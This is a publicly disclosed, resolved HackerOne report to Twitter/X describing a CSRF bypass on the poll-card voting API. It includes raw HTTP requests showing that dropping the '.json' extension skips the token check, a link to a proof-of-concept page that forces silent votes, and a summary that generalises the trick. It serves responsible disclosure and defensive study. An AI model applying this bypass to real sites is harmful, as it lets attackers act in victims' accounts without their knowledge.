{
  "id": 95555,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTU1NQ==",
  "url": "https://hackerone.com/reports/95555",
  "title": "CSRF on cards API",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-10-24T07:48:10.271Z",
  "submitted_at": "2015-10-24T07:48:10.271Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "filedescriptor",
    "url": "/filedescriptor",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61,
    "url": "https://hackerone.com/x",
    "handle": "x",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "X (Formerly Twitter)",
      "twitter_handle": "XSecurity",
      "website": "https://x.com",
      "about": "X helps you create and share ideas and information instantly, without barriers."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-04-11T03:26:55.147Z",
  "bug_reporter_agreed_on_going_public_at": "2017-03-12T03:26:50.532Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\nI would like to report an CSRF issue on the cards API endpoint (/i/cards/api/v1.json).\n\n##Detail\nCurrently the endpoint is responsible for poll cards (maybe more to come). When a user votes, a request will be sent to this endpoint to record the user's selected choice. By default there's a CSRF protection in place which looks for *authenticity_token* in the query part of the URI. However, such check only appears for the exact path (*/i/cards/api/v1.json*). Given that the server seems to relax path extension, attackers can circumvent the protection by using the path */i/cards/api/v1* (without .json) for the request.\n\nThis is how a normal request looks like:\n```http\nPOST https://twitter.com/i/cards/api/v1.json?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1\nHost: twitter.com\nCookie: foo=bar\n\n{\"twitter:string:card_uri\":\"card://657629230759415808\",\"twitter:long:original_tweet_id\":\"657629231309041664\",\"twitter:string:selected_choice\":\"2\"}\n```\n\nwithout providing a valid CSRF token, it will return a HTTP 403 error.\nNow that we trim the extension part (**v1.json** to **v1**) and resend it:\n```http\nPOST https://twitter.com/i/cards/api/v1?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1\nHost: twitter.com\nCookie: foo=bar\n\n{\"twitter:string:card_uri\":\"card://657629230759415808\",\"twitter:long:original_tweet_id\":\"657629231309041664\",\"twitter:string:selected_choice\":\"2\"}\n```\n\nit still lacks the CSRF token, but this time it returns HTTP 200 and the vote is successfully made.\nAll in all, attackers can abuse it and make victims to vote without noticing.\n\n#PoC\nHere's a handy tool to CSRF any poll. You may also just intercept the vote request to validate the issue.\n1. Go to http://innerht.ml/pocs/twitter-cards-csrf/\n2. Fill in the poll card's information you want to CSRF (e.g. for https://twitter.com/Bugcrowd/status/657629231309041664 the parameters are\ntweet_id: 657629231309041664, card_uri: card://657629230759415808, selected_choice: 2)\n3. Click the button to activate the attacke. Of course the whole process can be silent.",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-04-11T03:26:50.559Z",
  "allow_singular_disclosure_after": -215943655.94552994,
  "singular_disclosure_allowed": true,
  "vote_count": 38,
  "voters": [
    "delimitry",
    "kapytein",
    "adn",
    "hackerhero",
    "jon_bottarini",
    "ngalog",
    "0xleonidas",
    "apapedulimu",
    "secgeek",
    "naategh",
    "and 28 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 3536,
      "category": "researcher",
      "content": "This report demonstrates a technique to bypass CSRF protection by removing the file extension.\n\nIn short, if posting to `/api/entity.json` doesn't work, try `/api/entity`.",
      "user": {
        "id": 9081,
        "username": "filedescriptor",
        "name": "filedescriptor",
        "bio": "\\\"",
        "cleared": false,
        "verified": false,
        "website": "https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ",
        "location": "",
        "created_at": "2014-08-16T03:54:09.722Z",
        "url": "https://hackerone.com/filedescriptor",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
